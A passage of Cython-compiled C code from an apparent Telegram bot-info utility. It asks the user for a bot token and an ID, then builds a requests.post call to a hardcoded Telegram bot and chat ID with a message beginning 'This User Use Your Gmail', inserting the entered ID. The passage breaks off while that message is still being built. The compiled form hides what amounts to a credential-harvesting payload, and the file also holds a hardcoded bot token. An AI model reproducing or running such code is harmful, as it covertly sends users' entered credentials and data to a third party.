  PyList_SET_ITEM(__pyx_t_17, 3, __pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_16);
  PyList_SET_ITEM(__pyx_t_17, 4, __pyx_t_16);
  __Pyx_GIVEREF(__pyx_t_19);
  PyList_SET_ITEM(__pyx_t_17, 5, __pyx_t_19);
  __Pyx_GIVEREF(__pyx_t_18);
  PyList_SET_ITEM(__pyx_t_17, 6, __pyx_t_18);
  __pyx_t_4 = 0;
  __pyx_t_2 = 0;
  __pyx_t_1 = 0;
  __pyx_t_12 = 0;
  __pyx_t_16 = 0;
  __pyx_t_19 = 0;
  __pyx_t_18 = 0;
  __pyx_t_18 = __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_17); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_s6, __pyx_t_18) < 0) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_L, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 98, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 99, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 100, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 101, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_97m) < 0) __PYX_ERR(0, 102, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u__87) < 0) __PYX_ERR(0, 103, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 104, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_R, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 105, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_O, __pyx_kp_u_38_5_208m) < 0) __PYX_ERR(0, 106, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 107, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_red, __pyx_kp_u_1m_31m) < 0) __PYX_ERR(0, 109, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_green, __pyx_kp_u_1m_32m) < 0) __PYX_ERR(0, 110, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_yellow, __pyx_kp_u_1m_33m) < 0) __PYX_ERR(0, 111, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_blue, __pyx_kp_u_1m_34m) < 0) __PYX_ERR(0, 112, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cyan, __pyx_kp_u_1m_36m) < 0) __PYX_ERR(0, 113, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_magenta, __pyx_kp_u_1m_35m) < 0) __PYX_ERR(0, 114, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1m_36m) < 0) __PYX_ERR(0, 115, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_white, __pyx_kp_u_1m_37m) < 0) __PYX_ERR(0, 116, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_orange, __pyx_kp_u_1m_38_5_208m) < 0) __PYX_ERR(0, 117, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_reset, __pyx_kp_u_0m) < 0) __PYX_ERR(0, 118, __pyx_L1_error)

  
  __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_random); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 119, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_randint); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 119, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_17);
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
  __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_17, __pyx_tuple__88, NULL); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 119, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_memo, __pyx_t_18) < 0) __PYX_ERR(0, 119, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __pyx_t_18 = PyTuple_New(3); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 120, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __pyx_t_6 = 0;
  __pyx_t_14 = 127;
  __Pyx_INCREF(__pyx_kp_u_38_5);
  __pyx_t_6 += 7;
  __Pyx_GIVEREF(__pyx_kp_u_38_5);
  PyTuple_SET_ITEM(__pyx_t_18, 0, __pyx_kp_u_38_5);
  __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_memo); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 120, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_17);
  __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_t_17, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 120, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_14;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
  __Pyx_GIVEREF(__pyx_t_11);
  PyTuple_SET_ITEM(__pyx_t_18, 1, __pyx_t_11);
  __pyx_t_11 = 0;
  __Pyx_INCREF(__pyx_n_u_m_2);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_n_u_m_2);
  PyTuple_SET_ITEM(__pyx_t_18, 2, __pyx_n_u_m_2);
  __pyx_t_11 = __Pyx_PyUnicode_Join(__pyx_t_18, 3, __pyx_t_6, __pyx_t_14); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 120, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ror, __pyx_t_11) < 0) __PYX_ERR(0, 120, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_red, __pyx_kp_u_1_91m) < 0) __PYX_ERR(0, 123, __pyx_L1_error)

  
  __pyx_t_11 = __Pyx_Py3MetaclassPrepare((PyObject *) NULL, __pyx_empty_tuple, __pyx_n_s_DEM, __pyx_n_s_DEM, (PyObject *) NULL, __pyx_n_s_source, (PyObject *) NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 126, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);

  
  __pyx_t_18 = __Pyx_CyFunction_New(&__pyx_mdef_6source_3DEM_1__init__, 0, __pyx_n_s_DEM___init, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__90)); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 127, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  if (__Pyx_SetNameInClass(__pyx_t_11, __pyx_n_s_init, __pyx_t_18) < 0) __PYX_ERR(0, 127, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __pyx_t_18 = __Pyx_Py3ClassCreate(((PyObject*)&__Pyx_DefaultClassType), __pyx_n_s_DEM, __pyx_empty_tuple, __pyx_t_11, NULL, 0, 0); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 126, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_DEM, __pyx_t_18) < 0) __PYX_ERR(0, 126, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_s6); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __pyx_t_18 = PyNumber_Add(__pyx_t_11, __pyx_kp_u_s_ss); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Wsnuff, __pyx_t_18) < 0) __PYX_ERR(0, 134, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __pyx_t_18 = __Pyx_CyFunction_New(&__pyx_mdef_6source_1clear, 0, __pyx_n_s_clear, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__91)); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 163, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_clear, __pyx_t_18) < 0) __PYX_ERR(0, 163, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __pyx_t_18 = __Pyx_CyFunction_New(&__pyx_mdef_6source_3i, 0, __pyx_n_s_i, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__92)); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 167, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_i, __pyx_t_18) < 0) __PYX_ERR(0, 167, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_i); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 171, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __pyx_t_11 = __Pyx_PyObject_CallNoArg(__pyx_t_18); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 171, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

  
  __pyx_t_11 = PyTuple_New(5); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 172, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __pyx_t_6 = 0;
  __pyx_t_14 = 127;
  __Pyx_INCREF(__pyx_kp_u_1_32m_2);
  __pyx_t_6 += 9;
  __Pyx_GIVEREF(__pyx_kp_u_1_32m_2);
  PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_kp_u_1_32m_2);
  __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_s6); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 172, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_t_18, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 172, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_17);
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_14;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
  __Pyx_GIVEREF(__pyx_t_17);
  PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_t_17);
  __pyx_t_17 = 0;
  __Pyx_INCREF(__pyx_kp_u_s_s_s);
  __pyx_t_14 = (65535 > __pyx_t_14) ? 65535 : __pyx_t_14;
  __pyx_t_6 += 114;
  __Pyx_GIVEREF(__pyx_kp_u_s_s_s);
  PyTuple_SET_ITEM(__pyx_t_11, 2, __pyx_kp_u_s_s_s);
  __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_s6); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 172, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_17);
  __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_t_17, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 172, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) : __pyx_t_14;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_18);
  __Pyx_GIVEREF(__pyx_t_18);
  PyTuple_SET_ITEM(__pyx_t_11, 3, __pyx_t_18);
  __pyx_t_18 = 0;
  __Pyx_INCREF(__pyx_kp_u__93);
  __pyx_t_14 = (65535 > __pyx_t_14) ? 65535 : __pyx_t_14;
  __pyx_t_6 += 56;
  __Pyx_GIVEREF(__pyx_kp_u__93);
  PyTuple_SET_ITEM(__pyx_t_11, 4, __pyx_kp_u__93);
  __pyx_t_18 = __Pyx_PyUnicode_Join(__pyx_t_11, 5, __pyx_t_6, __pyx_t_14); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 172, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __pyx_t_11 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_18); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 172, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

  
  __pyx_t_11 = __Pyx_CyFunction_New(&__pyx_mdef_6source_5loading_animation, 0, __pyx_n_s_loading_animation, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__96)); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 183, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_loading_animation, __pyx_t_11) < 0) __PYX_ERR(0, 183, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

  
  __pyx_t_11 = __Pyx_CyFunction_New(&__pyx_mdef_6source_7get_bot_info, 0, __pyx_n_s_get_bot_info, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__98)); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 196, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_get_bot_info, __pyx_t_11) < 0) __PYX_ERR(0, 196, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

  
  __pyx_t_11 = __Pyx_CyFunction_New(&__pyx_mdef_6source_9get_user_info, 0, __pyx_n_s_get_user_info, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__100)); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 218, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_get_user_info, __pyx_t_11) < 0) __PYX_ERR(0, 218, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_name); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 245, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __pyx_t_3 = (__Pyx_PyUnicode_Equals(__pyx_t_11, __pyx_n_u_main, Py_EQ)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 245, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  if (__pyx_t_3) {

    
    __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__101, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 246, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_11);
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_token, __pyx_t_11) < 0) __PYX_ERR(0, 246, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

    
    __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__102, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 249, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_11);
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_loading_animation); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 250, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_11);
    __pyx_t_18 = __Pyx_PyObject_CallNoArg(__pyx_t_11); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 250, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_18);
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_get_bot_info); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 252, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_18);
    __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_token); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 252, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_11);
    __pyx_t_17 = __Pyx_PyObject_CallOneArg(__pyx_t_18, __pyx_t_11); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 252, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_17);
    __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;

    
    __pyx_t_17 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__103, NULL); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 254, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_17);
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_ID, __pyx_t_17) < 0) __PYX_ERR(0, 254, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;

    
    __pyx_t_17 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__104, NULL); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 257, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_17);
    __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_loading_animation); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 258, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_17);
    __pyx_t_11 = __Pyx_PyObject_CallNoArg(__pyx_t_17); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 258, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_11);
    __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_get_user_info); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 260, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_11);
    __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_token); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 260, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_17);
    __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_ID); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 260, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_18);
    __pyx_t_19 = PyTuple_New(2); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 260, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_19);
    __Pyx_GIVEREF(__pyx_t_17);
    PyTuple_SET_ITEM(__pyx_t_19, 0, __pyx_t_17);
    __Pyx_GIVEREF(__pyx_t_18);
    PyTuple_SET_ITEM(__pyx_t_19, 1, __pyx_t_18);
    __pyx_t_17 = 0;
    __pyx_t_18 = 0;
    __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_11, __pyx_t_19, NULL); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 260, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_18);
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
    __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_time); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 261, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_18);
    __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_sleep); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 261, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_19);
    __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
    __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_19, __pyx_tuple__105, NULL); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 261, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_18);
    __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
    __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

    
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_os); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 262, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_system); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 262, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_19);
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
  __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_19, __pyx_tuple__85, NULL); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 262, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Snuff, __pyx_kp_u_7765081594_AAGRwFlHwEjVQRmtS45vK) < 0) __PYX_ERR(0, 264, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Snuff73, __pyx_kp_u_7311958747) < 0) __PYX_ERR(0, 265, __pyx_L1_error)

  
  __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_requests); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 267, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_post); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 267, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_19);
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __pyx_t_18 = PyTuple_New(12); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __pyx_t_6 = 0;
  __pyx_t_14 = 127;
  __Pyx_INCREF(__pyx_kp_u_https_api_telegram_org_bot);
  __pyx_t_6 += 28;
  __Pyx_GIVEREF(__pyx_kp_u_https_api_telegram_org_bot);
  PyTuple_SET_ITEM(__pyx_t_18, 0, __pyx_kp_u_https_api_telegram_org_bot);
  __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_Snuff); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_t_11, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_17);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_14;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
  __Pyx_GIVEREF(__pyx_t_17);
  PyTuple_SET_ITEM(__pyx_t_18, 1, __pyx_t_17);
  __pyx_t_17 = 0;
  __Pyx_INCREF(__pyx_kp_u_sendMessage_chat_id);
  __pyx_t_6 += 21;
  __Pyx_GIVEREF(__pyx_kp_u_sendMessage_chat_id);
  PyTuple_SET_ITEM(__pyx_t_18, 2, __pyx_kp_u_sendMessage_chat_id);
  __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_Snuff73); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_17);
  __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_t_17, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_14;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
  __Pyx_GIVEREF(__pyx_t_11);
  PyTuple_SET_ITEM(__pyx_t_18, 3, __pyx_t_11);
  __pyx_t_11 = 0;
  __Pyx_INCREF(__pyx_kp_u_text_This_User_Use_Your_Gmail_m);
  __pyx_t_6 += 96;
  __Pyx_GIVEREF(__pyx_kp_u_text_This_User_Use_Your_Gmail_m);
  PyTuple_SET_ITEM(__pyx_t_18, 4, __pyx_kp_u_text_This_User_Use_Your_Gmail_m);
  __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_ID); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_t_11, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_17);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_14;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
  __Pyx_GIVEREF(__pyx_t_17);
  PyTuple_SET_ITEM(__pyx_t_18, 5, __pyx_t_17);
  __pyx_t_17 = 0;
  __Pyx_INCREF(__pyx_kp_u_IOS_LINK_tg_user_id);
  __pyx_t_6 += 28;
  __Pyx_GIVEREF(__pyx_kp_u_IOS_LINK_tg_user_id);
  PyTuple_SET_ITEM(__pyx_t_18, 6, __pyx_kp_u_IOS_LINK_tg_user_id);
  __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_ID); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_17);
  __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_t_17, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 268, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
